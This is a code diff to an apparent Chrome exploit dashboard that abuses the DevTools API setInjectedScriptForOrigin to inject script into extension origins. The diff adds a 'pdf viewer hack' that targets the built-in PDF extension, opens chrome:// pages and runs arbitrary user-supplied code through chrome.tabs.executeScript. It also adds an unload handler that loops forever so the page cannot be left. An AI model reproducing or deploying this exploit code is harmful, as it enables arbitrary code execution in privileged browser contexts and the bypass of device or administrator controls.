@@ -26,9 +26,17 @@
 
 
         function ui() {
+            const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
             var globalUID = 0;
             let globalMap = [];
             function payload_swamp(w, d) {
+                const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
+                if (location.origin.includes("chrome-extension://" + pdfId)) {
+                    chrome.tabs.create({url: "chrome://resources/mojo/mojo/public/js/bindings.js"}, function (x) {
+                        chrome.tabs.executeScript(x.id, {code: atob('%%CHROMEPAYLOAD%%')});
+                    });
+                    return;
+                }
                 // console.log(d);
                 // w.setTimeout(function() {
                 const blob_url = new Blob(["alert(1)"], { type: "text/html" });
@@ -91,10 +99,19 @@
                 <a href="devtools://devtools/bundled/devtools_app.html?experiments=true&ws=%%updaterurl%%">Re-open devtools</a>
                 <a href="javascript:void(0)" id="updater">Update payload</a>
                 <a href="javascript:void(0)" id="cleanup">Cleanup and reset for extension</a>
+                <a href="javascript:void(0)" id="activate">Chrome URLs</a>
+                
             `)
+            document.querySelector('#activate').onclick = function ( ) {
+                dbgext(false, pdfId);
+            }
+            onunload = function () {
+                while (true);
+            }
             document.close();
             document.title = "Dashboard";
             document.querySelector('#updater').onclick = function(ev) {
+                onunload = null;
                 const ws = new WebSocket("ws://%%updaterurl%%");
 
                 ws.onopen = function() {
@@ -127,17 +144,25 @@
                     }
                 }
             }
-            function dbgext(cleanup) {
-                let x = null;
+            function dbgext(cleanup, id) {
+                let x = id;
                 while (!x) {
                     x = prompt('Extension id?');
                     if (x === "cancel") {
                         return;
                     }
                 }
+                let path = 'manifest.json';
+                let is_pdf = false;
+                let injected = payload_swamp.toString();
+                if (x === pdfId) {
+                    path = "index.html"; // pdf viewer hack
+                    is_pdf = true;
+                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(prompt("code to execute!")));
+                }
                 const URL_1 = `chrome-extension://${x ??
-                    alert("NOTREACHED")}/manifest.json`;
-                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/manifest.json'); w.onload = function () {(${payload_swamp.toString()})(w, data.data)} }//`);
+                    alert("NOTREACHED")}/${path}`;
+                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                 const ifr = document.createElement("iframe");
                 ifr.src = URL_1;
                 document.body.appendChild(ifr);
